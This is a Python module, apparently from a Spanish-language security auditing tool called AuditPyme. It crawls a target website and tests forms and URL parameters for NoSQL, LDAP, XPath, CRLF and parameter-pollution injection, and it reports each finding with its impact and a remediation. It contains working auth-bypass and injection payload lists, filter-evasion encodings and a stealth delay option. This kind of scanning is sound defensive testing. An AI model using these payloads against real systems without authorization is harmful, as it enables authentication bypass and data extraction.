"""
Módulo de inyecciones avanzadas — AuditPyme
NoSQL Injection, LDAP Injection, XPath Injection, CRLF Injection, HTTP Parameter Pollution.
"""

import requests
import urllib3
import re
import time
import json
import random
from urllib.parse import urljoin, urlparse, urlencode, parse_qs, urlunparse, quote

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
TIMEOUT = 12
UA = "Mozilla/5.0 (compatible; AuditPyme/1.0)"

# ── NoSQL ─────────────────────────────────────────────────────────────────────

# Operadores MongoDB que cortocircuitan la lógica de autenticación/consulta
NOSQL_OPERATOR_PAYLOADS = [
    # Bypass de autenticación: campo[$ne]=x → {field: {$ne: "x"}} → siempre true
    ("[$ne]",   "nonexistent_value_9x7z", "MongoDB $ne operator bypass"),
    ("[$gt]",   "",                        "MongoDB $gt empty string bypass"),
    ("[$regex]",".*",                      "MongoDB $regex wildcard bypass"),
    ("[$exists]","true",                   "MongoDB $exists bypass"),
    ("[$in][]", "admin",                   "MongoDB $in array bypass"),
]

# Cuerpos JSON para endpoints que aceptan application/json
NOSQL_JSON_PAYLOADS = [
    ({"$gt": ""},        "$gt empty string"),
    ({"$ne": None},      "$ne null"),
    ({"$regex": ".*"},   "$regex wildcard"),
    ({"$where": "1==1"}, "$where tautology"),
    ({"$ne": "invalid_9z8y7x"}, "$ne nonexistent"),
]

# Time-based (MongoDB $where con sleep) — confirma NoSQLi ciego
NOSQL_TIME_PAYLOAD_JSON = {"$where": "sleep(4000)||'x'=='y'"}
NOSQL_TIME_PAYLOAD_FORM = "'; sleep(4000)//x"

# Errores típicos de MongoDB/NoSQL en la respuesta
NOSQL_ERROR_PATTERNS = [
    r"MongoError",
    r"BSONTypeError",
    r"MongoServerError",
    r"\$where",
    r"SyntaxError.*function",
    r"db\.collection",
    r"Operation\s+\`find\`",
    r"firestore",
    r"CouchDB",
    r"redis\.exceptions",
    r"noescape.*mongodb",
]

# ── LDAP ──────────────────────────────────────────────────────────────────────

# Payloads de inyección en filtros LDAP
LDAP_PAYLOADS = [
    # Bypass clásico: cierra el filtro actual y añade OR tautológico
    ("*",                                "Wildcard — enumera todos los usuarios"),
    ("*)(uid=*))(|(uid=*",               "Inyección OR — bypass de auth"),
    ("admin)(&(password=*))",            "Bypass de auth con attributo password"),
    ("*)(|(objectClass=*)",              "Dump de objectClass"),
    (")(|(password=*",                   "Extrae password field"),
    ("admin)(|(uid=*",                   "Enumera UIDs con tautología"),
    ("*\x00",                            "Null byte truncation"),
    (")(cn=*",                           "Enumera CN"),
    ("*)(mail=*",                        "Enumera atributos mail"),
]

# Errores típicos de LDAP en la respuesta
LDAP_ERROR_PATTERNS = [
    r"LDAP.*error",
    r"ldap_search",
    r"ldap_bind",
    r"javax\.naming",
    r"NamingException",
    r"0x51",             # LDAP error code
    r"invalid filter",
    r"LDAPException",
    r"size limit exceeded",
    r"operationsError",
    r"InvalidDnException",
    r"net\.sourceforge\.pac4j",
]

# ── XPath ─────────────────────────────────────────────────────────────────────

XPATH_PAYLOADS = [
    # Terminadores de string
    ("'",                           "Single quote — rotura de XPath string"),
    ("\"",                          "Double quote — rotura de XPath string"),
    # Tautologías boolean — same-node
    ("' or '1'='1",                 "OR tautología string"),
    ("' or 1=1 or 'a'='b",         "OR tautología numérica"),
    ("\" or \"1\"=\"1",             "OR tautología comilla doble"),
    # Inyección de nodo
    ("' or name()='user",           "name() node probe"),
    ("']]/*[1]/node()[1]|a[' ",     "Axis traversal"),
    ("' or count(parent::*[position()=1])=0 or 'a'='b", "Boolean count()"),
    # Union-based (sacar datos)
    ("' or 1=1 and '2'='2",        "AND tautología union-style"),
    ("admin' or 'x'='x",           "Auth bypass clásico XPath"),
]

XPATH_ERROR_PATTERNS = [
    r"XPathException",
    r"XPath.*error",
    r"xml\.etree",
    r"lxml.*error",
    r"SimpleXML",
    r"xpath.*invalid",
    r"Unfinished literal",
    r"xmlXPathEval",
    r"MSXML.*error",
    r"System\.Xml\.XPath",
    r"XPathNavigator",
]

# ── CRLF ──────────────────────────────────────────────────────────────────────

# Variantes de encoding de \r\n para evadir filtros de entrada
CRLF_SEQUENCES = [
    "%0d%0a",
    "%0D%0A",
    "%0a%0d",
    "\r\n",
    "%0d",
    "%0a",
    "%u000d%u000a",
    "%E5%98%8A%E5%98%8D",   # Unicode overlong
    "%E5%98%8D%E5%98%8A",
    "\\r\\n",
]

# La cabecera que intentamos inyectar
CRLF_INJECTED_HEADER = "X-AuditPyme-Injected"
CRLF_INJECTED_VALUE  = "crlf-test-1337"


# ── HTTP Parameter Pollution ───────────────────────────────────────────────────

HPP_SENTINEL = "auditpyme_hpp_7x9z"

# ── Scanner principal ─────────────────────────────────────────────────────────

class InjectionScanner:
    """Detecta inyecciones avanzadas: NoSQL, LDAP, XPath, CRLF, HPP."""

    def __init__(self, target: str, recon_data: dict = None, stealth: bool = False):
        self.target = target
        self.recon_data = recon_data or {}
        self.findings = []
        self.delay = 1.2 if stealth else 0
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": UA})
        self.session.verify = False
        self._base_urls = self._build_base_urls()
        self._forms: list[dict] = []
        self._params: list[dict] = []
        self._visited: set[str] = set()

    def scan(self) -> list:
        print(f"\n  [*] Injection scan (NoSQL/LDAP/XPath/CRLF/HPP): {self.target}")
        for base in self._base_urls:
            self._crawl(base, depth=2)
        print(f"  [*] {len(self._forms)} formularios, {len(self._params)} URLs con parámetros")

        self._check_nosql()
        self._check_ldap()
        self._check_xpath()
        self._check_crlf()
        self._check_hpp()

        if not self.findings:
            print("  [OK] No se detectaron inyecciones avanzadas")
        return self.findings

    # ── Crawler ───────────────────────────────────────────────────────────────

    def _crawl(self, url: str, depth: int):
        if depth == 0 or url in self._visited or len(self._visited) > 50:
            return
        if not any(url.startswith(b) for b in self._base_urls):
            return
        if any(p in url.lower() for p in ("logout", "signout", "delete")):
            return
        self._visited.add(url)

        try:
            resp = self.session.get(url, timeout=TIMEOUT, allow_redirects=True)
        except Exception:
            return

        for attrs, body in re.findall(r'<form([^>]*)>(.*?)</form>', resp.text,
                                      re.IGNORECASE | re.DOTALL):
            action_m = re.search(r'action=["\']?([^"\'> ]+)["\']?', attrs, re.IGNORECASE)
            action = action_m.group(1) if action_m else ""
            form_url = urljoin(url, action) if action and action != "#" else url
            method = "post" if re.search(r'method=["\']?post["\']?', attrs, re.IGNORECASE) else "get"
            fields: dict[str, str] = {}
            for tag in re.findall(r'<input[^>]+>', body, re.IGNORECASE):
                n = re.search(r'name=["\']([^"\']+)["\']', tag, re.IGNORECASE)
                t = re.search(r'type=["\']([^"\']+)["\']', tag, re.IGNORECASE)
                v = re.search(r'value=["\']([^"\']*)["\']', tag, re.IGNORECASE)
                if n and (not t or t.group(1).lower() not in ("submit", "button", "hidden")):
                    fields[n.group(1)] = v.group(1) if v else "test"
            if fields:
                entry = {"url": form_url, "method": method, "fields": fields}
                if entry not in self._forms:
                    self._forms.append(entry)

        for href in re.findall(r'href=["\']([^"\'#]+)["\']', resp.text, re.IGNORECASE):
            full = urljoin(url, href)
            parsed = urlparse(full)
            if parsed.query and full not in self._visited:
                self._params.append({"url": full, "params": parse_qs(parsed.query),
                                     "parsed": parsed})
            if depth > 1 and any(full.startswith(b) for b in self._base_urls):
                self._crawl(full, depth - 1)

    # ── NoSQL Injection ───────────────────────────────────────────────────────

    def _check_nosql(self):
        print("  [*] Probando NoSQL injection...")

        for form in self._forms[:10]:
            self._nosql_form(form)

        for p in self._params[:15]:
            self._nosql_params(p)

    def _nosql_form(self, form: dict):
        base_data = {**form["fields"]}

        # Intentar detectar respuesta baseline
        try:
            if form["method"] == "post":
                baseline = self.session.post(form["url"], data=base_data, timeout=TIMEOUT)
            else:
                baseline = self.session.get(form["url"], params=base_data, timeout=TIMEOUT)
            baseline_len = len(baseline.text)
            baseline_status = baseline.status_code
        except Exception:
            return

        # 1) Operadores en sufijo de clave (PHP / Express style: campo[$ne]=val)
        for field in form["fields"]:
            for suffix, value, label in NOSQL_OPERATOR_PAYLOADS:
                injected_key = field + suffix
                data = {**base_data, injected_key: value}
                try:
                    time.sleep(self.delay)
                    if form["method"] == "post":
                        resp = self.session.post(form["url"], data=data, timeout=TIMEOUT)
                    else:
                        resp = self.session.get(form["url"], params=data, timeout=TIMEOUT)

                    if self._nosql_hit(resp, baseline_len, baseline_status):
                        self._add_nosql(form["url"], f"campo '{field}' ({label})",
                                        f"{field}{suffix}={value}")
                        return
                except Exception:
                    pass

        # 2) Cuerpo JSON con operadores
        json_headers = {**self.session.headers, "Content-Type": "application/json"}
        for field in form["fields"]:
            for operator, label in NOSQL_JSON_PAYLOADS:
                body = {**{k: "test" for k in form["fields"]}, field: operator}
                try:
                    time.sleep(self.delay)
                    resp = self.session.post(form["url"], data=json.dumps(body),
                                             headers=json_headers, timeout=TIMEOUT)
                    if self._nosql_hit(resp, baseline_len, baseline_status):
                        self._add_nosql(form["url"], f"campo '{field}' JSON ({label})",
                                        json.dumps({field: operator}))
                        return
                except Exception:
                    pass

        # 3) Time-based con $where
        for field in form["fields"]:
            body = {**{k: "test" for k in form["fields"]}, field: NOSQL_TIME_PAYLOAD_JSON}
            try:
                t0 = time.time()
                time.sleep(self.delay)
                self.session.post(form["url"], data=json.dumps(body),
                                  headers={**self.session.headers,
                                           "Content-Type": "application/json"},
                                  timeout=8)
                elapsed = time.time() - t0
                if elapsed >= 3.5:
                    self._add_nosql(form["url"],
                                    f"campo '{field}' time-based ($where sleep)",
                                    json.dumps({field: NOSQL_TIME_PAYLOAD_JSON}),
                                    time_based=True)
                    return
            except requests.Timeout:
                self._add_nosql(form["url"],
                                f"campo '{field}' time-based ($where sleep — timeout)",
                                json.dumps({field: NOSQL_TIME_PAYLOAD_JSON}),
                                time_based=True)
                return
            except Exception:
                pass

    def _nosql_params(self, p: dict):
        try:
            baseline = self.session.get(p["url"], timeout=TIMEOUT)
            baseline_len = len(baseline.text)
            baseline_status = baseline.status_code
        except Exception:
            return

        for param in p["params"]:
            for suffix, value, label in NOSQL_OPERATOR_PAYLOADS:
                url_parts = list(p["parsed"])
                new_params = {**{k: v[0] for k, v in p["params"].items()},
                              param + suffix: value}
                url_parts[4] = urlencode(new_params)
                test_url = urlunparse(url_parts)
                try:
                    time.sleep(self.delay)
                    resp = self.session.get(test_url, timeout=TIMEOUT)
                    if self._nosql_hit(resp, baseline_len, baseline_status):
                        self._add_nosql(p["url"], f"parámetro '{param}' ({label})",
                                        f"{param}{suffix}={value}")
                        return
                except Exception:
                    pass

    def _nosql_hit(self, resp, baseline_len: int, baseline_status: int) -> bool:
        # Hit si: errores típicos OR cambio significativo de longitud OR status 200 donde antes no
        text = resp.text
        for pattern in NOSQL_ERROR_PATTERNS:
            if re.search(pattern, text, re.IGNORECASE):
                return True
        # Cambio de longitud > 30% puede indicar bypass (más datos devueltos)
        if baseline_len > 50:
            ratio = abs(len(text) - baseline_len) / baseline_len
            if ratio > 0.30 and resp.status_code == 200 and baseline_status != 200:
                return True
        return False

    def _add_nosql(self, url: str, location: str, payload: str, time_based: bool = False):
        tipo = "time-based" if time_based else "error/response-based"
        self._add(
            "HIGH",
            f"NoSQL Injection ({tipo})",
            f"Inyección NoSQL detectada en {location}. "
            f"URL: {url}\nPayload: {payload}",
            "Un atacante puede bypassear autenticación, extraer todos los documentos de la "
            "base de datos, ejecutar JavaScript en el servidor (MongoDB $where) y realizar "
            "ataques de denegación de servicio mediante consultas costosas.",
            "Nunca construir consultas concatenando input del usuario. Usar parámetros "
            "tipados: en Mongoose usar .findOne({user: String(req.body.user)}). "
            "Validar y sanitizar con Joi o express-validator. Deshabilitar $where en MongoDB "
            "(--noscripting). Usar MongoDB 4.4+ con Queryable Encryption.",
        )
        print(f"  [HIGH] NoSQL Injection — {location}")

    # ── LDAP Injection ────────────────────────────────────────────────────────

    def _check_ldap(self):
        print("  [*] Probando LDAP injection...")

        for form in self._forms[:10]:
            if not self._looks_like_auth_or_search(form):
                continue
            self._ldap_form(form)

        for p in self._params[:15]:
            self._ldap_params(p)

    def _looks_like_auth_or_search(self, form: dict) -> bool:
        """Heurística: formularios de login o búsqueda son los más probables."""
        combined = " ".join(form["fields"].keys()).lower() + form["url"].lower()
        keywords = ("user", "login", "username", "email", "search", "query",
                    "uid", "cn", "dn", "name", "filter", "lookup")
        return any(k in combined for k in keywords)

    def _ldap_form(self, form: dict):
        try:
            base = self.session.post(form["url"], data=form["fields"], timeout=TIMEOUT) \
                if form["method"] == "post" \
                else self.session.get(form["url"], params=form["fields"], timeout=TIMEOUT)
            baseline_len = len(base.text)
        except Exception:
            return

        for field in form["fields"]:
            for payload, desc in LDAP_PAYLOADS:
                data = {**form["fields"], field: payload}
                try:
                    time.sleep(self.delay)
                    if form["method"] == "post":
                        resp = self.session.post(form["url"], data=data, timeout=TIMEOUT)
                    else:
                        resp = self.session.get(form["url"], params=data, timeout=TIMEOUT)

                    if self._ldap_hit(resp, baseline_len):
                        self._add_ldap(form["url"], f"campo '{field}' — {desc}", payload)
                        return
                except Exception:
                    pass

    def _ldap_params(self, p: dict):
        try:
            base = self.session.get(p["url"], timeout=TIMEOUT)
            baseline_len = len(base.text)
        except Exception:
            return

        for param in p["params"]:
            for payload, desc in LDAP_PAYLOADS[:5]:
                url_parts = list(p["parsed"])
                new_params = {**{k: v[0] for k, v in p["params"].items()}, param: payload}
                url_parts[4] = urlencode(new_params)
                test_url = urlunparse(url_parts)
                try:
                    time.sleep(self.delay)
                    resp = self.session.get(test_url, timeout=TIMEOUT)
                    if self._ldap_hit(resp, baseline_len):
                        self._add_ldap(p["url"], f"parámetro '{param}' — {desc}", payload)
                        return
                except Exception:
                    pass

    def _ldap_hit(self, resp, baseline_len: int) -> bool:
        text = resp.text
        for pattern in LDAP_ERROR_PATTERNS:
            if re.search(pattern, text, re.IGNORECASE):
                return True
        # Wildcard * puede devolver muchos más resultados
        if len(text) > baseline_len * 1.5 and resp.status_code == 200:
            return True
        return False

    def _add_ldap(self, url: str, location: str, payload: str):
        self._add(
            "HIGH",
            "LDAP Injection",
            f"Inyección LDAP detectada en {location}. "
            f"URL: {url}\nPayload: {payload}",
            "Un atacante puede bypassear autenticación LDAP/Active Directory, enumerar "
            "todos los usuarios del directorio, extraer atributos sensibles (contraseñas, "
            "hashes, grupos) y escalar privilegios en el dominio.",
            "Escapar los caracteres especiales LDAP antes de incluirlos en filtros: "
            r"( ) * \ / NUL → \28 \29 \2a \5c \2f \00. "
            "Usar librerías con parámetros binding (ldap3 con escape_filter_chars). "
            "Validar input con allowlist estricta. Principio de mínimo privilegio en la "
            "cuenta de servicio LDAP.",
        )
        print(f"  [HIGH] LDAP Injection — {location}")

    # ── XPath Injection ───────────────────────────────────────────────────────

    def _check_xpath(self):
        print("  [*] Probando XPath injection...")

        for form in self._forms[:10]:
            self._xpath_form(form)

        for p in self._params[:15]:
            self._xpath_params(p)

    def _xpath_form(self, form: dict):
        try:
            base = self.session.post(form["url"], data=form["fields"], timeout=TIMEOUT) \
                if form["method"] == "post" \
                else self.session.get(form["url"], params=form["fields"], timeout=TIMEOUT)
            baseline_len = len(base.text)
            baseline_status = base.status_code
        except Exception:
            return

        for field in form["fields"]:
            for payload, desc in XPATH_PAYLOADS:
                data = {**form["fields"], field: payload}
                try:
                    time.sleep(self.delay)
                    if form["method"] == "post":
                        resp = self.session.post(form["url"], data=data, timeout=TIMEOUT)
                    else:
                        resp = self.session.get(form["url"], params=data, timeout=TIMEOUT)

                    if self._xpath_hit(resp, baseline_len, baseline_status):
                        self._add_xpath(form["url"], f"campo '{field}' — {desc}", payload)
                        return
                except Exception:
                    pass

    def _xpath_params(self, p: dict):
        try:
            base = self.session.get(p["url"], timeout=TIMEOUT)
            baseline_len = len(base.text)
            baseline_status = base.status_code
        except Exception:
            return

        for param in p["params"]:
            for payload, desc in XPATH_PAYLOADS[:6]:
                url_parts = list(p["parsed"])
                new_params = {**{k: v[0] for k, v in p["params"].items()}, param: payload}
                url_parts[4] = urlencode(new_params)
                test_url = urlunparse(url_parts)
                try:
                    time.sleep(self.delay)
                    resp = self.session.get(test_url, timeout=TIMEOUT)
                    if self._xpath_hit(resp, baseline_len, baseline_status):
                        self._add_xpath(p["url"], f"parámetro '{param}' — {desc}", payload)
                        return
                except Exception:
                    pass

    def _xpath_hit(self, resp, baseline_len: int, baseline_status: int) -> bool:
        text = resp.text
        for pattern in XPATH_ERROR_PATTERNS:
            if re.search(pattern, text, re.IGNORECASE):
                return True
        # Tautología '1'='1' puede devolver más resultados o status 200 cuando antes era 403
        if (resp.status_code == 200 and baseline_status in (401, 403, 302)
                and len(text) > 100):
            return True
        return False

    def _add_xpath(self, url: str, location: str, payload: str):
        self._add(
            "HIGH",
            "XPath Injection",
            f"Inyección XPath detectada en {location}. "
            f"URL: {url}\nPayload: {payload}",
            "Un atacante puede bypassear autenticación basada en XML, extraer el contenido "
            "completo del documento XML (credenciales, datos de sesión, configuración), "
            "y mapear la estructura del almacén de datos mediante consultas booleanas ciegas.",
            "Nunca concatenar input del usuario en expresiones XPath. Usar XPath parametrizado "
            "(Saxon, libxml2 con variables). Validar el input con allowlist estricta. "
            "Deshabilitar el acceso a funciones XPath peligrosas (doc(), collection()).",
        )
        print(f"  [HIGH] XPath Injection — {location}")

    # ── CRLF Injection ────────────────────────────────────────────────────────

    def _check_crlf(self):
        print("  [*] Probando CRLF injection...")

        for base_url in self._base_urls:
            self._crlf_url(base_url)

        for p in self._params[:15]:
            self._crlf_params(p)

        # Probar en cabeceras comunes que se reflejan en redirects
        self._crlf_headers()

    def _crlf_url(self, base_url: str):
        """Inyección en el propio path de la URL."""
        for seq in CRLF_SEQUENCES[:5]:
            injected_path = f"{base_url}/{seq}{CRLF_INJECTED_HEADER}: {CRLF_INJECTED_VALUE}"
            try:
                time.sleep(self.delay)
                resp = self.session.get(injected_path, timeout=TIMEOUT,
                                        allow_redirects=False)
                if self._crlf_hit(resp):
                    self._add_crlf(base_url, "path de URL", injected_path, seq)
                    return
            except Exception:
                pass

    def _crlf_params(self, p: dict):
        for param in p["params"]:
            for seq in CRLF_SEQUENCES[:6]:
                injected = f"test{seq}{CRLF_INJECTED_HEADER}: {CRLF_INJECTED_VALUE}"
                url_parts = list(p["parsed"])
                new_params = {**{k: v[0] for k, v in p["params"].items()}, param: injected}
                url_parts[4] = urlencode(new_params, quote_via=quote)
                test_url = urlunparse(url_parts)
                try:
                    time.sleep(self.delay)
                    resp = self.session.get(test_url, timeout=TIMEOUT, allow_redirects=False)
                    if self._crlf_hit(resp):
                        self._add_crlf(p["url"], f"parámetro '{param}'", injected, seq)
                        return
                except Exception:
                    pass

    def _crlf_headers(self):
        """Prueba CRLF en cabeceras de redirección como Location/Referer."""
        for base_url in self._base_urls:
            for seq in CRLF_SEQUENCES[:4]:
                injected = f"http://example.com/{seq}{CRLF_INJECTED_HEADER}: {CRLF_INJECTED_VALUE}"
                try:
                    time.sleep(self.delay)
                    resp = self.session.get(
                        base_url,
                        headers={**self.session.headers, "Referer": injected,
                                 "X-Forwarded-Host": injected},
                        timeout=TIMEOUT, allow_redirects=False
                    )
                    if self._crlf_hit(resp):
                        self._add_crlf(base_url, "cabecera Referer/X-Forwarded-Host",
                                       injected, seq)
                        return
                except Exception:
                    pass

    def _crlf_hit(self, resp) -> bool:
        """Verifica si la cabecera inyectada aparece en la respuesta."""
        header_name = CRLF_INJECTED_HEADER.lower()
        # Comprobación en cabeceras HTTP de la respuesta
        for key, val in resp.headers.items():
            if key.lower() == header_name and CRLF_INJECTED_VALUE in val:
                return True
        # Comprobación en Set-Cookie (caso típico de response splitting)
        set_cookie = resp.headers.get("Set-Cookie", "")
        if CRLF_INJECTED_VALUE in set_cookie:
            return True
        # Comprobación en body (algunos servidores reflejan cabeceras en el cuerpo)
        if CRLF_INJECTED_HEADER in resp.text and CRLF_INJECTED_VALUE in resp.text:
            return True
        return False

    def _add_crlf(self, url: str, location: str, payload: str, seq: str):
        self._add(
            "MEDIUM",
            "CRLF Injection / HTTP Response Splitting",
            f"La secuencia CRLF ({repr(seq)}) en {location} se refleja en las cabeceras "
            f"de respuesta.\nURL: {url}\nPayload: {payload[:120]}",
            "Un atacante puede inyectar cabeceras HTTP arbitrarias, crear cookies de sesión "
            "falsas, realizar cache poisoning, XSS vía cabeceras reflejadas, y "
            "HTTP Response Splitting para secuestrar sesiones de otros usuarios.",
            "Eliminar o rechazar \\r (0x0D) y \\n (0x0A) de cualquier input incluido "
            "en cabeceras HTTP. Usar las APIs de cabecera del framework (no concatenación "
            "manual). En PHP: header() ya filtra CRLF desde 4.4.2; verificar que esté "
            "actualizado. En Node.js: res.setHeader() lanza error ante CRLF desde v14.",
        )
        print(f"  [MEDIUM] CRLF Injection — {location} (seq: {repr(seq)})")

    # ── HTTP Parameter Pollution ───────────────────────────────────────────────

    def _check_hpp(self):
        print("  [*] Probando HTTP Parameter Pollution...")

        for p in self._params[:15]:
            self._hpp_params(p)

        for form in self._forms[:10]:
            self._hpp_form(form)

    def _hpp_params(self, p: dict):
        for param in p["params"]:
            original_val = p["params"][param][0]
            try:
                # Baseline
                time.sleep(self.delay)
                base_resp = self.session.get(p["url"], timeout=TIMEOUT)
                baseline = base_resp.text

                # Petición normal
                normal_resp = self.session.get(
                    p["url"].split("?")[0],
                    params={param: original_val},
                    timeout=TIMEOUT
                )

                # Petición duplicada: param=original&param=HPP_SENTINEL
                dup_url = (p["url"].split("?")[0] +
                           f"?{param}={quote(original_val)}&{param}={HPP_SENTINEL}")
                dup_resp = self.session.get(dup_url, timeout=TIMEOUT)

                if self._hpp_hit(normal_resp, dup_resp):
                    self._add_hpp(p["url"], f"parámetro '{param}'",
                                  f"{param}={original_val}&{param}={HPP_SENTINEL}")
            except Exception:
                pass

    def _hpp_form(self, form: dict):
        for field in form["fields"]:
            original = form["fields"][field]
            try:
                time.sleep(self.delay)
                if form["method"] == "post":
                    normal = self.session.post(form["url"], data=form["fields"],
                                               timeout=TIMEOUT)
                    # Duplicar campo: incluir el campo dos veces
                    dup_data = list(form["fields"].items()) + [(field, HPP_SENTINEL)]
                    dup = self.session.post(form["url"], data=dup_data, timeout=TIMEOUT)
                else:
                    normal = self.session.get(form["url"], params=form["fields"],
                                              timeout=TIMEOUT)
                    dup_params = list(form["fields"].items()) + [(field, HPP_SENTINEL)]
                    dup = self.session.get(form["url"], params=dup_params, timeout=TIMEOUT)

                if self._hpp_hit(normal, dup):
                    self._add_hpp(form["url"], f"campo '{field}' (formulario)",
                                  f"{field}={original}&{field}={HPP_SENTINEL}")
            except Exception:
                pass

    def _hpp_hit(self, normal_resp, dup_resp) -> bool:
        """Detecta HPP si el valor centinela aparece en la respuesta duplicada."""
        if HPP_SENTINEL in dup_resp.text and HPP_SENTINEL not in normal_resp.text:
            return True
        # Cambio de comportamiento significativo (el servidor usa el segundo valor)
        if (dup_resp.status_code != normal_resp.status_code and
                dup_resp.status_code in (200, 302)):
            return True
        return False

    def _add_hpp(self, url: str, location: str, payload: str):
        self._add(
            "LOW",
            "HTTP Parameter Pollution (HPP)",
            f"El servidor procesa parámetros duplicados de forma inconsistente en "
            f"{location}.\nURL: {url}\nPayload: {payload}",
            "HPP puede usarse para bypassear WAF/IDS (dividiendo payloads maliciosos en "
            "múltiples parámetros), manipular la lógica de la aplicación, corromper "
            "valores en firmas digitales y evadir filtros de input.",
            "Definir explícitamente cómo manejar parámetros duplicados (usar solo el "
            "primero o solo el último, nunca concatenarlos). Validar con framework "
            "estándar (Spring, Django, Rails ya tienen comportamiento definido). "
            "Rechazar peticiones con parámetros duplicados en el WAF.",
        )
        print(f"  [LOW] HTTP Parameter Pollution — {location}")

    # ── Helpers ───────────────────────────────────────────────────────────────

    def _build_base_urls(self) -> list:
        urls = []
        for host in self.recon_data.get("hosts", []):
            if host["estado"] != "up":
                continue
            for p in host["puertos"]:
                port = p["puerto"]
                svc = p["servicio"].lower()
                if "http" in svc or port in (80, 443, 8080, 8443):
                    proto = "https" if port in (443, 8443) else "http"
                    url = (f"{proto}://{self.target}:{port}"
                           if port not in (80, 443) else f"{proto}://{self.target}")
                    if url not in urls:
                        urls.append(url)
        return urls or [f"https://{self.target}"]

    def _add(self, severidad, nombre, descripcion, impacto, recomendacion):
        for f in self.findings:
            if f["nombre"] == nombre:
                return
        self.findings.append({
            "severidad":     severidad,
            "tipo":          "Injection",
            "nombre":        nombre,
            "descripcion":   descripcion,
            "impacto":       impacto,
            "recomendacion": recomendacion,
        })
